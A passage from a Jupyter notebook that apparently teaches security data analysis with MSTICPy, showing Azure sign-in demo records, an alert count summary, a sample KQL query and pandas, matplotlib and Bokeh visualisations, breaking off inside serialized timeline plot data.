       "9                                                                                []   \n",
       "22                                                                               []   \n",
       "37  [\\r\\n  {\\r\\n    \"key\": \"Login Hint Present\",\\r\\n    \"value\": \"True\"\\r\\n  }\\r\\n]   \n",
       "\n",
       "     AuthenticationRequirement  ... NetworkLocationDetails  \\\n",
       "2   singleFactorAuthentication  ...                     []   \n",
       "3                          NaN  ...                     []   \n",
       "9   singleFactorAuthentication  ...                     []   \n",
       "22                         NaN  ...                     []   \n",
       "37  singleFactorAuthentication  ...                     []   \n",
       "\n",
       "                       OriginalRequestId ProcessingTimeInMilliseconds  \\\n",
       "2   f05079ed-f820-4531-ab26-498b53af3800                          366   \n",
       "3   121dca00-0930-40fe-9b69-bbc1e33c3500                          394   \n",
       "9   121dca00-0930-40fe-9b69-bbc1e33c3500                          394   \n",
       "22  f05079ed-f820-4531-ab26-498b53af3800                          366   \n",
       "37  39f36cc7-ad3e-430c-bf78-bc96fbc33300                          553   \n",
       "\n",
       "   RiskDetail RiskEventTypes RiskEventTypes_V2  RiskLevelAggregated  \\\n",
       "2        none             []                []                 none   \n",
       "3        none             []               NaN                 none   \n",
       "9        none             []                []                 none   \n",
       "22       none             []               NaN                 none   \n",
       "37       none             []                []                 none   \n",
       "\n",
       "   RiskLevelDuringSignIn RiskState                   ResourceDisplayName  \\\n",
       "2                   none      none  Windows Azure Service Management API   \n",
       "3                   none      none  Windows Azure Service Management API   \n",
       "9                   none      none  Windows Azure Service Management API   \n",
       "22                  none      none  Windows Azure Service Management API   \n",
       "37                  none      none  Windows Azure Service Management API   \n",
       "\n",
       "                        ResourceIdentity ServicePrincipalId  \\\n",
       "2   797f4846-ba00-4fd7-ba43-dac1f8f63013                NaN   \n",
       "3   797f4846-ba00-4fd7-ba43-dac1f8f63013                NaN   \n",
       "9   797f4846-ba00-4fd7-ba43-dac1f8f63013                NaN   \n",
       "22  797f4846-ba00-4fd7-ba43-dac1f8f63013                NaN   \n",
       "37  797f4846-ba00-4fd7-ba43-dac1f8f63013                NaN   \n",
       "\n",
       "   ServicePrincipalName            Status  TokenIssuerName TokenIssuerType  \\\n",
       "2                   NaN  {'errorCode': 0}              NaN         AzureAD   \n",
       "3                   NaN  {'errorCode': 0}              NaN         AzureAD   \n",
       "9                   NaN  {'errorCode': 0}              NaN         AzureAD   \n",
       "22                  NaN  {'errorCode': 0}              NaN         AzureAD   \n",
       "37                  NaN  {'errorCode': 0}              NaN         AzureAD   \n",
       "\n",
       "                                                                                              UserAgent  \\\n",
       "2   Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.404...   \n",
       "3   Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.404...   \n",
       "9   Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.404...   \n",
       "22  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.404...   \n",
       "37  Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safa...   \n",
       "\n",
       "   UserDisplayName                                UserId  \\\n",
       "2         CTFUser3  acc49186-e946-4f6c-85af-669807da0e0f   \n",
       "3         Zack Von  2566a1a6-4d03-40d2-8836-6c8cf1ce517f   \n",
       "9         Zack Von  2566a1a6-4d03-40d2-8836-6c8cf1ce517f   \n",
       "22        CTFUser3  acc49186-e946-4f6c-85af-669807da0e0f   \n",
       "37        CTFUser3  acc49186-e946-4f6c-85af-669807da0e0f   \n",
       "\n",
       "        UserPrincipalName                           AADTenantId        Type  \\\n",
       "2   ctfuser3@seccxp.ninja  4b2462a4-bbee-495a-a0e1-f23ae524cc9c  SigninLogs   \n",
       "3       zvon@seccxp.ninja  4b2462a4-bbee-495a-a0e1-f23ae524cc9c  SigninLogs   \n",
       "9       zvon@seccxp.ninja  4b2462a4-bbee-495a-a0e1-f23ae524cc9c  SigninLogs   \n",
       "22  ctfuser3@seccxp.ninja  4b2462a4-bbee-495a-a0e1-f23ae524cc9c  SigninLogs   \n",
       "37  ctfuser3@seccxp.ninja  4b2462a4-bbee-495a-a0e1-f23ae524cc9c  SigninLogs   \n",
       "\n",
       "    Result   Latitude   Longitude  \n",
       "2   Sucess  42.997181  -86.848312  \n",
       "3   Sucess  48.614380 -121.110313  \n",
       "9   Sucess  48.614380 -121.110313  \n",
       "22  Sucess  42.997181  -86.848312  \n",
       "37  Sucess  41.465630  -73.610718  \n",
       "\n",
       "[5 rows x 62 columns]"
      ]
     },
     "execution_count": 31,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "logons_df = qry_prov.Azure.list_all_signins_geo()\n",
    "\n",
    "if logons_df.empty:\n",
    "    md(\"The query returned no rows for this time range. Using demo data.\")\n",
    "    logons_df = qry_prov_loc.Azure.list_all_signins_geo()\n",
    "\n",
    "logons_df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "id": "535861a2",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>NumAlerts</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>AlertName</th>\n",
       "      <th></th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>Detected suspicious file download</th>\n",
       "      <td>4</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Possible suspicious scheduling tasks access detected</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Potential attempt to bypass AppLocker detected</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>SSH Anomalous Login ML</th>\n",
       "      <td>30</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Security incident detected</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                      NumAlerts\n",
       "AlertName                                                      \n",
       "Detected suspicious file download                             4\n",
       "Possible suspicious scheduling tasks access detected          1\n",
       "Potential attempt to bypass AppLocker detected                1\n",
       "SSH Anomalous Login ML                                       30\n",
       "Security incident detected                                    2"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "from datetime import datetime, timedelta\n",
    "\n",
    "if qry_prov.environment == \"AzureSentinel\":\n",
    "    display(\n",
    "        qry_prov.SecurityAlert.list_alerts(\n",
    "            start=datetime.utcnow() - timedelta(2),\n",
    "            end=datetime.utcnow(),\n",
    "            add_query_items=\"| summarize NumAlerts=count() by AlertName\"\n",
    "        ).head()\n",
    "    )\n",
    "else:\n",
    "    display(\n",
    "        qry_prov.SecurityAlert.list_alerts()\n",
    "        [[\"AlertName\", \"TimeGenerated\"]]\n",
    "        .groupby(\"AlertName\")\n",
    "        .count()\n",
    "        .rename(columns={\"TimeGenerated\": \"NumAlerts\"})\n",
    "        .head()\n",
    "    )"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "id": "1d22945a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "exec_query not supported for local data\n",
      "\"\n",
      "OfficeActivity\n",
      "| where TimeGenerated > ago(1d)\n",
      "| take 5\n",
      "\n"
     ]
    }
   ],
   "source": [
    "test_query = \"\"\"\"\n",
    "OfficeActivity\n",
    "| where TimeGenerated > ago(1d)\n",
    "| take 5\n",
    "\"\"\"\n",
    "\n",
    "if qry_prov.environment == \"LocalData\":\n",
    "    print(\"exec_query not supported for local data\")\n",
    "    print(test_query)\n",
    "else:\n",
    "    office_events_df = qry_prov.exec_query(test_query)\n",
    "    display(office_events_df)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ac2dbd35",
   "metadata": {},
   "source": [
    "## Part 2 - Visualizing data"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0d19a8d4",
   "metadata": {},
   "source": [
    "### 1 - Using pandas and matplotlib\n",
    "Python has a wide range of data visualization packages each of which have their own benifits and drawbacks."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "id": "187bcbd2",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 800x1000 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Basic Graphs\n",
    "#%pip install matplotlib\n",
    "import matplotlib\n",
    "\n",
    "plot_df = logons_df\n",
    "if len(plot_df) > 100:\n",
    "    plot_df = plot_df[:100]\n",
    "\n",
    "plot_df[\"IPAddress\"].value_counts().plot.barh(\n",
    "    title=\"IP prevalence\", legend=True, figsize=(8, 10)\n",
    ");\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "id": "7274f4c1",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 800x1000 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "plot_df['IPAddress'].value_counts().plot.pie(\n",
    "    title=\"Share of Logons per IP\", figsize=(8, 10)\n",
    ");"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e4130971",
   "metadata": {},
   "source": [
    "### 2 - MSTICPy Event Timeline"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "id": "8fdf582b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "    <style>\n",
       "        .bk-notebook-logo {\n",
       "            display: block;\n",
       "            width: 20px;\n",
       "            height: 20px;\n",
       "            background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAALEgAACxIB0t1+/AAAABx0RVh0U29mdHdhcmUAQWRvYmUgRmlyZXdvcmtzIENTNui8sowAAAOkSURBVDiNjZRtaJVlGMd/1/08zzln5zjP1LWcU9N0NkN8m2CYjpgQYQXqSs0I84OLIC0hkEKoPtiH3gmKoiJDU7QpLgoLjLIQCpEsNJ1vqUOdO7ppbuec5+V+rj4ctwzd8IIbbi6u+8f1539dt3A78eXC7QizUF7gyV1fD1Yqg4JWz84yffhm0qkFqBogB9rM8tZdtwVsPUhWhGcFJngGeWrPzHm5oaMmkfEg1usvLFyc8jLRqDOMru7AyC8saQr7GG7f5fvDeH7Ej8CM66nIF+8yngt6HWaKh7k49Soy9nXurCi1o3qUbS3zWfrYeQDTB/Qj6kX6Ybhw4B+bOYoLKCC9H3Nu/leUTZ1JdRWkkn2ldcCamzrcf47KKXdAJllSlxAOkRgyHsGC/zRday5Qld9DyoM4/q/rUoy/CXh3jzOu3bHUVZeU+DEn8FInkPBFlu3+nW3Nw0mk6vCDiWg8CeJaxEwuHS3+z5RgY+YBR6V1Z1nxSOfoaPa4LASWxxdNp+VWTk7+4vzaou8v8PN+xo+KY2xsw6une2frhw05CTYOmQvsEhjhWjn0bmXPjpE1+kplmmkP3suftwTubK9Vq22qKmrBhpY4jvd5afdRA3wGjFAgcnTK2s4hY0/GPNIb0nErGMCRxWOOX64Z8RAC4oCXdklmEvcL8o0BfkNK4lUg9HTl+oPlQxdNo3Mg4Nv175e/1LDGzZen30MEjRUtmXSfiTVu1kK8W4txyV6BMKlbgk3lMwYCiusNy9fVfvvwMxv8Ynl6vxoByANLTWplvuj/nF9m2+PDtt1eiHPBr1oIfhCChQMBw6Aw0UulqTKZdfVvfG7VcfIqLG9bcldL/+pdWTLxLUy8Qq38heUIjh4XlzZxzQm19lLFlr8vdQ97rjZVOLf8nclzckbcD4wxXMidpX30sFd37Fv/GtwwhzhxGVAprjbg0gCAEeIgwCZyTV2Z1REEW8O4py0wsjeloKoMr6iCY6dP92H6Vw/oTyICIthibxjm/DfN9lVz8IqtqKYLUXfoKVMVQVVJOElGjrnnUt9T9wbgp8AyYKaGlqingHZU/uG2NTZSVqwHQTWkx9hxjkpWDaCg6Ckj5qebgBVbT3V3NNXMSiWSDdGV3hrtzla7J+duwPOToIg42ChPQOQjspnSlp1V+Gjdged7+8UN5CRAV7a5EdFNwCjEaBR27b3W890TE7g24NAP/mMDXRWrGoFPQI9ls/MWO2dWFAar/xcOIImbbpA3zgAAAABJRU5ErkJggg==);\n",
       "        }\n",
       "    </style>\n",
       "    <div>\n",
       "        <a href=\"https://bokeh.org\" target=\"_blank\" class=\"bk-notebook-logo\"></a>\n",
       "        <span id=\"d3d74475-79f6-473d-b60c-507d5790c812\">Loading BokehJS ...</span>\n",
       "    </div>\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": "'use strict';\n(function(root) {\n  function now() {\n    return new Date();\n  }\n\n  const force = true;\n\n  if (typeof root._bokeh_onload_callbacks === \"undefined\" || force === true) {\n    root._bokeh_onload_callbacks = [];\n    root._bokeh_is_loading = undefined;\n  }\n\nconst JS_MIME_TYPE = 'application/javascript';\n  const HTML_MIME_TYPE = 'text/html';\n  const EXEC_MIME_TYPE = 'application/vnd.bokehjs_exec.v0+json';\n  const CLASS_NAME = 'output_bokeh rendered_html';\n\n  /**\n   * Render data to the DOM node\n   */\n  function render(props, node) {\n    const script = document.createElement(\"script\");\n    node.appendChild(script);\n  }\n\n  /**\n   * Handle when an output is cleared or removed\n   */\n  function handleClearOutput(event, handle) {\n    function drop(id) {\n      const view = Bokeh.index.get_by_id(id)\n      if (view != null) {\n        view.model.document.clear()\n        Bokeh.index.delete(view)\n      }\n    }\n\n    const cell = handle.cell;\n\n    const id = cell.output_area._bokeh_element_id;\n    const server_id = cell.output_area._bokeh_server_id;\n\n    // Clean up Bokeh references\n    if (id != null) {\n      drop(id)\n    }\n\n    if (server_id !== undefined) {\n      // Clean up Bokeh references\n      const cmd_clean = \"from bokeh.io.state import curstate; print(curstate().uuid_to_server['\" + server_id + \"'].get_sessions()[0].document.roots[0]._id)\";\n      cell.notebook.kernel.execute(cmd_clean, {\n        iopub: {\n          output: function(msg) {\n            const id = msg.content.text.trim()\n            drop(id)\n          }\n        }\n      });\n      // Destroy server and session\n      const cmd_destroy = \"import bokeh.io.notebook as ion; ion.destroy_server('\" + server_id + \"')\";\n      cell.notebook.kernel.execute(cmd_destroy);\n    }\n  }\n\n  /**\n   * Handle when a new output is added\n   */\n  function handleAddOutput(event, handle) {\n    const output_area = handle.output_area;\n    const output = handle.output;\n\n    // limit handleAddOutput to display_data with EXEC_MIME_TYPE content only\n    if ((output.output_type != \"display_data\") || (!Object.prototype.hasOwnProperty.call(output.data, EXEC_MIME_TYPE))) {\n      return\n    }\n\n    const toinsert = output_area.element.find(\".\" + CLASS_NAME.split(' ')[0]);\n\n    if (output.metadata[EXEC_MIME_TYPE][\"id\"] !== undefined) {\n      toinsert[toinsert.length - 1].firstChild.textContent = output.data[JS_MIME_TYPE];\n      // store reference to embed id on output_area\n      output_area._bokeh_element_id = output.metadata[EXEC_MIME_TYPE][\"id\"];\n    }\n    if (output.metadata[EXEC_MIME_TYPE][\"server_id\"] !== undefined) {\n      const bk_div = document.createElement(\"div\");\n      bk_div.innerHTML = output.data[HTML_MIME_TYPE];\n      const script_attrs = bk_div.children[0].attributes;\n      for (let i = 0; i < script_attrs.length; i++) {\n        toinsert[toinsert.length - 1].firstChild.setAttribute(script_attrs[i].name, script_attrs[i].value);\n        toinsert[toinsert.length - 1].firstChild.textContent = bk_div.children[0].textContent\n      }\n      // store reference to server id on output_area\n      output_area._bokeh_server_id = output.metadata[EXEC_MIME_TYPE][\"server_id\"];\n    }\n  }\n\n  function register_renderer(events, OutputArea) {\n\n    function append_mime(data, metadata, element) {\n      // create a DOM node to render to\n      const toinsert = this.create_output_subarea(\n        metadata,\n        CLASS_NAME,\n        EXEC_MIME_TYPE\n      );\n      this.keyboard_manager.register_events(toinsert);\n      // Render to node\n      const props = {data: data, metadata: metadata[EXEC_MIME_TYPE]};\n      render(props, toinsert[toinsert.length - 1]);\n      element.append(toinsert);\n      return toinsert\n    }\n\n    /* Handle when an output is cleared or removed */\n    events.on('clear_output.CodeCell', handleClearOutput);\n    events.on('delete.Cell', handleClearOutput);\n\n    /* Handle when a new output is added */\n    events.on('output_added.OutputArea', handleAddOutput);\n\n    /**\n     * Register the mime type and append_mime function with output_area\n     */\n    OutputArea.prototype.register_mime_type(EXEC_MIME_TYPE, append_mime, {\n      /* Is output safe? */\n      safe: true,\n      /* Index of renderer in `output_area.display_order` */\n      index: 0\n    });\n  }\n\n  // register the mime type if in Jupyter Notebook environment and previously unregistered\n  if (root.Jupyter !== undefined) {\n    const events = require('base/js/events');\n    const OutputArea = require('notebook/js/outputarea').OutputArea;\n\n    if (OutputArea.prototype.mime_types().indexOf(EXEC_MIME_TYPE) == -1) {\n      register_renderer(events, OutputArea);\n    }\n  }\n  if (typeof (root._bokeh_timeout) === \"undefined\" || force === true) {\n    root._bokeh_timeout = Date.now() + 5000;\n    root._bokeh_failed_load = false;\n  }\n\n  const NB_LOAD_WARNING = {'data': {'text/html':\n     \"<div style='background-color: #fdd'>\\n\"+\n     \"<p>\\n\"+\n     \"BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \\n\"+\n     \"may be due to a slow or bad network connection. Possible fixes:\\n\"+\n     \"</p>\\n\"+\n     \"<ul>\\n\"+\n     \"<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\\n\"+\n     \"<li>use INLINE resources instead, as so:</li>\\n\"+\n     \"</ul>\\n\"+\n     \"<code>\\n\"+\n     \"from bokeh.resources import INLINE\\n\"+\n     \"output_notebook(resources=INLINE)\\n\"+\n     \"</code>\\n\"+\n     \"</div>\"}};\n\n  function display_loaded(error = null) {\n    const el = document.getElementById(\"d3d74475-79f6-473d-b60c-507d5790c812\");\n    if (el != null) {\n      const html = (() => {\n        if (typeof root.Bokeh === \"undefined\") {\n          if (error == null) {\n            return \"BokehJS is loading ...\";\n          } else {\n            return \"BokehJS failed to load.\";\n          }\n        } else {\n          const prefix = `BokehJS ${root.Bokeh.version}`;\n          if (error == null) {\n            return `${prefix} successfully loaded.`;\n          } else {\n            return `${prefix} <b>encountered errors</b> while loading and may not function as expected.`;\n          }\n        }\n      })();\n      el.innerHTML = html;\n\n      if (error != null) {\n        const wrapper = document.createElement(\"div\");\n        wrapper.style.overflow = \"auto\";\n        wrapper.style.height = \"5em\";\n        wrapper.style.resize = \"vertical\";\n        const content = document.createElement(\"div\");\n        content.style.fontFamily = \"monospace\";\n        content.style.whiteSpace = \"pre-wrap\";\n        content.style.backgroundColor = \"rgb(255, 221, 221)\";\n        content.textContent = error.stack ?? error.toString();\n        wrapper.append(content);\n        el.append(wrapper);\n      }\n    } else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(() => display_loaded(error), 100);\n    }\n  }\n\n  function run_callbacks() {\n    try {\n      root._bokeh_onload_callbacks.forEach(function(callback) {\n        if (callback != null)\n          callback();\n      });\n    } finally {\n      delete root._bokeh_onload_callbacks\n    }\n    console.debug(\"Bokeh: all callbacks have finished\");\n  }\n\n  function load_libs(css_urls, js_urls, callback) {\n    if (css_urls == null) css_urls = [];\n    if (js_urls == null) js_urls = [];\n\n    root._bokeh_onload_callbacks.push(callback);\n    if (root._bokeh_is_loading > 0) {\n      console.debug(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n      return null;\n    }\n    if (js_urls == null || js_urls.length === 0) {\n      run_callbacks();\n      return null;\n    }\n    console.debug(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n    root._bokeh_is_loading = css_urls.length + js_urls.length;\n\n    function on_load() {\n      root._bokeh_is_loading--;\n      if (root._bokeh_is_loading === 0) {\n        console.debug(\"Bokeh: all BokehJS libraries/stylesheets loaded\");\n        run_callbacks()\n      }\n    }\n\n    function on_error(url) {\n      console.error(\"failed to load \" + url);\n    }\n\n    for (let i = 0; i < css_urls.length; i++) {\n      const url = css_urls[i];\n      const element = document.createElement(\"link\");\n      element.onload = on_load;\n      element.onerror = on_error.bind(null, url);\n      element.rel = \"stylesheet\";\n      element.type = \"text/css\";\n      element.href = url;\n      console.debug(\"Bokeh: injecting link tag for BokehJS stylesheet: \", url);\n      document.body.appendChild(element);\n    }\n\n    for (let i = 0; i < js_urls.length; i++) {\n      const url = js_urls[i];\n      const element = document.createElement('script');\n      element.onload = on_load;\n      element.onerror = on_error.bind(null, url);\n      element.async = false;\n      element.src = url;\n      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n      document.head.appendChild(element);\n    }\n  };\n\n  function inject_raw_css(css) {\n    const element = document.createElement(\"style\");\n    element.appendChild(document.createTextNode(css));\n    document.body.appendChild(element);\n  }\n\n  const js_urls = [\"https://cdn.bokeh.org/bokeh/release/bokeh-3.7.3.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-3.7.3.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-3.7.3.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-3.7.3.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-mathjax-3.7.3.min.js\"];\n  const css_urls = [];\n\n  const inline_js = [    function(Bokeh) {\n      Bokeh.set_log_level(\"info\");\n    },\nfunction(Bokeh) {\n    }\n  ];\n\n  function run_inline_js() {\n    if (root.Bokeh !== undefined || force === true) {\n      try {\n            for (let i = 0; i < inline_js.length; i++) {\n      inline_js[i].call(root, root.Bokeh);\n    }\n\n      } catch (error) {display_loaded(error);throw error;\n      }if (force === true) {\n        display_loaded();\n      }} else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(run_inline_js, 100);\n    } else if (!root._bokeh_failed_load) {\n      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n      root._bokeh_failed_load = true;\n    } else if (force !== true) {\n      const cell = $(document.getElementById(\"d3d74475-79f6-473d-b60c-507d5790c812\")).parents('.cell').data().cell;\n      cell.output_area.append_execute_result(NB_LOAD_WARNING)\n    }\n  }\n\n  if (root._bokeh_is_loading === 0) {\n    console.debug(\"Bokeh: BokehJS loaded, going straight to plotting\");\n    run_inline_js();\n  } else {\n    load_libs(css_urls, js_urls, function() {\n      console.debug(\"Bokeh: BokehJS plotting callback run at\", now());\n      run_inline_js();\n    });\n  }\n}(window));",
      "application/vnd.bokehjs_load.v0+json": ""
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "  <div id=\"b15b4e2f-9f48-4a3e-bfdf-381b3285df98\" data-root-id=\"p2366\" style=\"display: contents;\"></div>\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": "(function(root) {\n  function embed_document(root) {\n  const docs_json = {\"68f7be1f-55f7-4e17-a575-6f9844aa6b68\":{\"version\":\"3.7.3\",\"title\":\"Bokeh Application\",\"roots\":[{\"type\":\"object\",\"name\":\"Column\",\"id\":\"p2366\",\"attributes\":{\"children\":[{\"type\":\"object\",\"name\":\"Figure\",\"id\":\"p2217\",\"attributes\":{\"width\":900,\"height\":300,\"x_range\":{\"type\":\"object\",\"name\":\"Range1d\",\"id\":\"p2227\",\"attributes\":{\"start\":1755239052715.6328,\"end\":1755294178766.833}},\"y_range\":{\"type\":\"object\",\"name\":\"Range1d\",\"id\":\"p2228\",\"attributes\":{\"start\":-1.0}},\"x_scale\":{\"type\":\"object\",\"name\":\"LinearScale\",\"id\":\"p2229\"},\"y_scale\":{\"type\":\"object\",\"name\":\"LinearScale\",\"id\":\"p2230\"},\"title\":{\"type\":\"object\",\"name\":\"Title\",\"id\":\"p2220\",\"attributes\":{\"text\":\"Timeline: Logon Events\"}},\"renderers\":[{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p2363\",\"attributes\":{\"data_source\":{\"type\":\"object\",\"name\":\"ColumnDataSource\",\"id\":\"p2179\",\"attributes\":{\"selected\":{\"type\":\"object\",\"name\":\"Selection\",\"id\":\"p2180\",\"attributes\":{\"indices\":[],\"line_indices\":[]}},\"selection_policy\":{\"type\":\"object\",\"name\":\"UnionRenderers\",\"id\":\"p2181\"},\"data\":{\"type\":\"map\",\"entries\":[[\"index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"AgAAAAMAAAAJAAAAFgAAACUAAAAnAAAALgAAADoAAABBAAAASQAAAEoAAABgAAAAaQAAAGoAAABuAAAAeAAAAKQAAACqAAAAtwAAALkAAADBAAAA2QAAANoAAADgAAAA4QAAAOIAAADwAAAA9wAAADcBAAA5AQAAPQEAAFoBAABeAQAAYAEAAGEBAACkAQAAqAEAALEBAACyAQAAswEAALQBAAC1AQAAtgEAALcBAAC7AQAAvgEAAMwBAADNAQAAzwEAANABAADRAQAA0gEAANMBAADUAQAA1QEAANYBAADXAQAA2AEAANsBAADdAQAA3gEAABUCAAAWAgAAMgIAADMCAAA0AgAANQIAADYCAAA3AgAATwIAAF4CAABiAgAAYwIAAG4CAABwAgAAcwIAAH0CAACMAgAAkgIAAKACAACkAgAAqwIAAKwCAACyAgAAtQIAAMACAAA=\"},\"shape\":[86],\"dtype\":\"int32\",\"order\":\"little\"}],[\"AppDisplayName\",{\"type\":\"ndarray\",\"array\":[\"Azure Portal\",\"Azure Portal\",\"Azure Portal\",\"Azure Portal\",\"Azure Portal\",\"Azure Portal\",\"Azure Portal\",\"Azure Portal\",\"Office 365 Exchange Online\",\"Office 365 SharePoint Online\",\"Office 365 SharePoint Online\",\"Office 365 Exchange Online\",\"Microsoft 365 Security and Compliance Center\",\"Office365 Shell WCSS-Client\",\"Azure Portal\",\"Microsoft Forms\",\"Azure Portal\",\"Office365 Shell WCSS-Client\",\"Microsoft 365 Security and Compliance Center\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Microsoft Cloud App Security\",\"Office365 Shell WCSS-Client\",\"Microsoft Cloud App Security\",\"Office365 Shell WCSS-Client\",\"Skype Web Experience On Office 365\",\"Skype Web Experience On Office 365\",\"Microsoft Stream Portal\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Skype Web Experience On Office 365\",\"Skype Web Experience On Office 365\",\"O365 Suite UX\",\"O365 Suite UX\",\"Office 365 Exchange Online\",\"Office365 Shell WCSS-Client\",\"Skype Web Experience On Office 365\",\"Skype Web Experience On Office 365\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office 365 Exchange Online\",\"Skype Web Experience On Office 365\",\"Office 365 SharePoint Online\",\"SharePoint Online Web Client Extensibility\",\"Office 365 SharePoint Online\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Skype Web Experience On Office 365\",\"Office365 Shell WCSS-Client\",\"Skype Web Experience On Office 365\",\"Office365 Shell WCSS-Client\",\"Skype Web Experience On Office 365\",\"SharePoint Online Web Client Extensibility\",\"Office365 Shell WCSS-Client\",\"Skype Web Experience On Office 365\",\"Microsoft Forms\",\"Azure Portal\",\"Azure Portal\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office 365 Exchange Online\",\"Office365 Shell WCSS-Client\",\"Microsoft 365 Security and Compliance Center\",\"Microsoft 365 Security and Compliance Center\",\"Office 365 Exchange Online\",\"Microsoft Stream Portal\",\"Office365 Shell WCSS-Client\",\"Microsoft Cloud App Security\",\"Microsoft Cloud App Security\",\"Microsoft Cloud App Security\",\"Microsoft Cloud App Security\",\"Microsoft Cloud App Security\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Microsoft 365 Security and Compliance Center\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell 